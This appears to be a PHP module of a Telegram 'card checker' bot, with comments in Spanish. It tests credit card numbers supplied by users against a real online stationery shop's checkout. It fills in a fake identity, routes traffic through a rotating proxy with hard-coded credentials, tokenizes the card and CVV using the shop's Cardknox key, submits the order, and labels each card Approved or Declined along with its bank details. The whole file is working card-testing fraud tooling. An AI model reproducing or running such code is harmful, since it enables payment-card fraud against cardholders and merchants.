<?php

$gatewayname="kn";
if (preg_match('/^[\/\.,\$](?:'.$gatewayname.')(?:\s+(.+))?$/i', $message, $matches)) {
//==================[Inicializacion de variables]======================//
$messages = $bot->loadPlantillas();
$gateway = "#CardKnox (".'$3'.")";
$lang = $db->getUserLanguage($userId);
//==================[Manejo de los Usuarios]======================//
 $accessMessage = $db->verifyUserAccess($userId, $chat_id,'$'.$gatewayname);
if ($accessMessage !== null) {
$bot->callApi('sendMessage', [
    'chat_id' => $chat_id,
    'text' => $bot->translateTemplate($accessMessage, 'en', $lang),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
    ]);
    return; 
    }
    
//==================[Mensaje configuracion y time]======================//
$lista = $bot->getCleanList($message, $replyMessageText);
$starttim = microtime(true);
//==================[REGEX]======================//
$validationResult = $bot->validateCreditCard($lista);
if (is_string($validationResult)) {
    $editmessage = $bot->callApi('SendMessage', [
        'chat_id' => $chat_id,
        'text' => $bot->translateTemplate($validationResult, 'en', $lang),
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true

    ])
    ]);
    sleep(3);
    $bot->callApi('deleteMessage', [
        'chat_id' => $chat_id,
        'message_id' => $editmessage 
    ]);
    return;
}

$cc = $validationResult['cc'];
$mes = $bot->formatearMes($validationResult['mes']);
$ano = $validationResult['ano'];
$ano1 = (strlen($ano) == 2) ? $ano : substr($ano, 2);
$cvv = $validationResult['cvv'];
$creditcard = $validationResult['creditcard'];
    //==================[Antispam]======================//
    $antispam = $db->antispamCheck($userId,$username?:$firstname);

    if($antispam != False){
        $editmessage = $bot->callApi('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>$antispam,
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    
        ])
      ]);
      sleep(3);
      $bot->callApi('deleteMessage', [
          'chat_id' => $chat_id,
          'message_id' => $editmessage 
      ]);
      return;
    }
$editmessage = $bot->callApi('SendMessage', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['vSiesta_gateway'], 'en', $lang),
$gateway,
    $creditcard),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
]);
    

 //==================[Random Direcciones]======================//
    $userData = Fake::GetUser('US');

    $firstName = $userData['first_name'];
    $lastName = $userData['last_name'];
    $username1 = $userData['username'];
    $email = $userData['email'];
    $password = $userData['password'];
    $phone = $userData['phone']['format2'];
    $userAgent = $userData['userAgent'];

    $street = $userData['street'];
    $country = $userData['country'];
    $iso2 = $userData['iso2'];
    $state = $userData['state'];
    $state_id = $userData['state_id'];
    $city = $userData['city'];
    $zip = $userData['zip'];
    $lastFourDigits = substr($cc, -4);
 //==================[Bin Verificador]======================//
    $bin = substr($cc, 0, 6);
    $resultado = $bot->verificarBin($bin);

    if (!is_string($resultado)) { // Verificamos que no sea un mensaje de error
        $brand = $resultado['brand'];
        $country = $resultado['country'];
        $country_name = $resultado['country_name'];
        $country_flag = $resultado['country_flag'];
        $country_currencies = $resultado['country_currencies'];
        $bank = $resultado['bank'];
        $level = $resultado['level'];
        $type = $resultado['type'];
    } else {
        $bot->callApi('EditMessageText', [
            'chat_id' => $chat_id,
            'text' => $resultado,
            'parse_mode' => 'html',
            'message_id' => $editmessage,
         
        ]);
        exit();
    }
    
 //==================[Proxys y Cookies]======================//
 $socks5 = "gw.dataimpulse.com:823";
 $rotate = "b097452cc0d2c2bcc268:7580f00952ea0161";
 
 $cookie = uniqid();

 switch (substr($cc, 0, 1)) {
    case '3':
        $type = "Amex";
        break;
    case '5':
        $type = "Mastercard";
        break;
    case '6':
        $type = "Discover";
        break;
    default:
        $type = "Visa";
        break;
}

 $proxies = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

 //==================[Curl Request]======================//
 
 $response = CurlX::Get(
    "https://advantagewritingsupplies.com/papermate-white-pearl-clutch-eraser-3cd-2",
    [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);
$__RequestVerificationToken = CurlX::ParseString($response->body,'<input name="__RequestVerificationToken" type="hidden" value="','"');
echo "<hr>__RequestVerificationToken : " . $__RequestVerificationToken . " <hr>";



$response = CurlX::Post(
    "https://advantagewritingsupplies.com/AddProductFromProductDetailsPageToCartAjax",
    'addtocart_8227.EnteredQuantity=1&CountryId=0&StateProvinceId=0&ZipPostalCode=&product_attribute_888=3907&product_attribute_987=4425&product_attribute_743=3265&product_attribute_600=2621&product_attribute_31=154&product_attribute_931=4126&product_attribute_817=3608&product_attribute_607=2657&product_attribute_695=3087&product_attribute_344=1423&__RequestVerificationToken='.$__RequestVerificationToken.'&productId=8227&isAddToCartButton=true',
    [
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'Origin: https://advantagewritingsupplies.com',
        'Referer: https://advantagewritingsupplies.com/papermate-white-pearl-clutch-eraser-3cd-2',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'X-Requested-With: XMLHttpRequest'
    ],    
    $cookie,
    $proxies
);


$response = CurlX::Get(
    "https://advantagewritingsupplies.com/login/checkoutasguest?returnUrl=%2Fcart",
    [
        'Referer: https://advantagewritingsupplies.com/papermate-white-pearl-clutch-eraser-3cd-2',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);

$response = CurlX::Get(
    "https://advantagewritingsupplies.com/checkout",
    [
        'Referer: https://advantagewritingsupplies.com/login/checkoutasguest?returnUrl=%2Fcart',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);

$__RequestVerificationToken = CurlX::ParseString($response->body,'<input name=__RequestVerificationToken type=hidden value=','>');

echo "<hr>__RequestVerificationToken : " . $__RequestVerificationToken . " <hr>";

$response = CurlX::Post(
    "https://advantagewritingsupplies.com/checkout/billingaddress",
    'ShipToSameAddress=true&BillingNewAddress.Id=0&BillingNewAddress.FirstName=Price&BillingNewAddress.LastName=Berge&BillingNewAddress.Email='.urlencode($email).'&BillingNewAddress.Company=org&BillingNewAddress.CountryId=237&BillingNewAddress.StateProvinceId=1678&BillingNewAddress.City=Healy&BillingNewAddress.Address1=238.7+George+Parks+Hwy&BillingNewAddress.Address2=&BillingNewAddress.ZipPostalCode=99743&BillingNewAddress.PhoneNumber=9076832746&BillingNewAddress.FaxNumber=+9076832746&nextstep=&__RequestVerificationToken='.$__RequestVerificationToken.'&ShipToSameAddress=false',
    [
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://advantagewritingsupplies.com',
        'Referer: https://advantagewritingsupplies.com/checkout/billingaddress',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);

$__RequestVerificationToken = CurlX::ParseString($response->body,'<input name=__RequestVerificationToken type=hidden value=','>');
echo "<hr>__RequestVerificationToken : " . $__RequestVerificationToken . " <hr>";

$response = CurlX::Post(
    "https://advantagewritingsupplies.com/checkout/billingaddress",
    'ShipToSameAddress=true&BillingNewAddress.Id=0&BillingNewAddress.FirstName=Price&BillingNewAddress.LastName=Berge&BillingNewAddress.Email='.urlencode($email).'&BillingNewAddress.Company=org&BillingNewAddress.CountryId=237&BillingNewAddress.StateProvinceId=1678&BillingNewAddress.City=Healy&BillingNewAddress.Address1=238.7+George+Parks+Hwy&BillingNewAddress.Address2=&BillingNewAddress.ZipPostalCode=99743&BillingNewAddress.PhoneNumber=9076832746&BillingNewAddress.FaxNumber=+9076832746&nextstep=&__RequestVerificationToken='.$__RequestVerificationToken.'&ShipToSameAddress=false',
    [
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://advantagewritingsupplies.com',
        'Referer: https://advantagewritingsupplies.com/checkout/billingaddress',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);

$__RequestVerificationToken = CurlX::ParseString($response->body,'<input name=__RequestVerificationToken type=hidden value=','>');

echo "<hr>__RequestVerificationToken : " . $__RequestVerificationToken . " <hr>";

$response = CurlX::Post(
    "https://advantagewritingsupplies.com/checkout/paymentmethod",
    'paymentmethod=Payments.Cardknox&nextstep=&__RequestVerificationToken='.$__RequestVerificationToken.'',
    [
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://advantagewritingsupplies.com',
        'Referer: https://advantagewritingsupplies.com/checkout/paymentmethod',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);

$__RequestVerificationToken = CurlX::ParseString($response->body,'<input name=__RequestVerificationToken type=hidden value=','>');
echo "<hr>__RequestVerificationToken : " . $__RequestVerificationToken . " <hr>";

$response = CurlX::Post(
    "https://cdn.cardknox.com/api/ifields/gettoken",
    '{"xKey":"ifields_advantagegifts17cbb4cd7ce44a698fde3da","xVersion":"2.6.2006.0102","xReferrer":"https://advantagewritingsupplies.com/checkout/paymentinfo","xSoftwareName":"nopCommerce Cardknox Plugin","xSoftwareVersion":"4.40","xTokenType":"card","xTokenVersion":1,"xData":"'.$cc.'","xThreeDSEnabled":false,"xThreeDSData":{"xEci":"","xCavv":"","xId":""}}',
    [
        'Content-Type: application/json; charset=UTF-8',
        'Origin: https://cdn.cardknox.com',
        'Referer: https://cdn.cardknox.com/ifields/2.6.2006.0102/ifield.htm',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'X-Requested-With: XMLHttpRequest'
    ],
    $cookie,
    $proxies
);

$xCardNum = urlencode(CurlX::ParseString($response->body,'"xToken":"','"'));
echo "<hr>xCardNum : " . $xCardNum . " <hr>";

$response = CurlX::Post(
    "https://cdn.cardknox.com/api/ifields/gettoken",
    '{"xKey":"ifields_advantagegifts17cbb4cd7ce44a698fde3da","xVersion":"2.6.2006.0102","xReferrer":"https://advantagewritingsupplies.com/checkout/paymentinfo","xSoftwareName":"nopCommerce Cardknox Plugin","xSoftwareVersion":"4.40","xTokenType":"cvv","xTokenVersion":1,"xData":"'.$cvv.'","xThreeDSEnabled":false,"xThreeDSData":{"xEci":"","xCavv":"","xId":""}}',
    [
        'Content-Type: application/json; charset=UTF-8',
        'Origin: https://cdn.cardknox.com',
        'Referer: https://cdn.cardknox.com/ifields/2.6.2006.0102/ifield.htm',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'X-Requested-With: XMLHttpRequest'
    ],
    $cookie,
    $proxies
);
$xCVV = urlencode(CurlX::ParseString($response->body,'"xToken":"','"'));
echo "<hr>xCVV : " . $xCVV . " <hr>";


$response = CurlX::Post(
    "https://advantagewritingsupplies.com/checkout/paymentinfo",
    'xACH=&xCVV='.$xCVV.'&xCardNum='.$xCardNum.'&CardNumber='.$xCardNum.'&CardCode='.$xCVV.'&CardholderName=Pince+Uks&ExpireMonth='.$mes.'&ExpireYear='.$ano.'&nextstep=&__RequestVerificationToken='.$__RequestVerificationToken.'',
    [
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://advantagewritingsupplies.com',
        'Referer: https://advantagewritingsupplies.com/checkout/paymentinfo',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);

$__RequestVerificationToken = CurlX::ParseString($response->body,'<input name=__RequestVerificationToken type=hidden value=','>');


echo "<hr>Token : " . $__RequestVerificationToken . " <hr>";

$response = CurlX::Post(
    "https://advantagewritingsupplies.com/checkout/confirm",
    'nextstep=&__RequestVerificationToken='.$__RequestVerificationToken.'',
    [
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://advantagewritingsupplies.com',
        'Referer: https://advantagewritingsupplies.com/checkout/confirm',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);


 //==================[Manejo de los mensajes]======================//
 $errormessage = trim(strip_tags(CurlX::ParseString($response->body,'<div class="message-error">','</ul>')));

if($errormessage=="null") {
    $errormessage="Declined";
    file_put_contents(__DIR__ . "/../Responses/".str_replace(' ', '', trim($gateway)).".txt",$response->body);
}
 //==================[Fin time]======================//
$starttime = intval(microtime(true) - $starttim);
 //==================[Manejo del bot]======================//
 if($errormessage1 == "Payment error: Payment declined. Error code: 01287 - Error Message: INV CVV2 MATCH"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
            " $errormessage",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "42 Credit Floor"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
          " $errormessage",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage1 == "Your account was created successfully"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText(  "Approved Auth!✅", "en", $lang),
            " $errormessage",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage1 == "Gateway Rejected: avs"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText(  "Approved!✅", "en", $lang),
           " $errormessage",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 else{
$bot->callApi('EditMessageText', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['gateway'], 'en', $lang),
        $gateway,
        $creditcard,
        $bot->translateText("Declined!❌", "en", $lang),
       " $errormessage",
        "$type - $level",
        $bank,
        "$country_name$country_flag",
        $starttime,
        $username ?: $firstname
    ),
    'parse_mode' => 'html',
    'message_id' => $editmessage,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
 
        ])
    ]);
}}
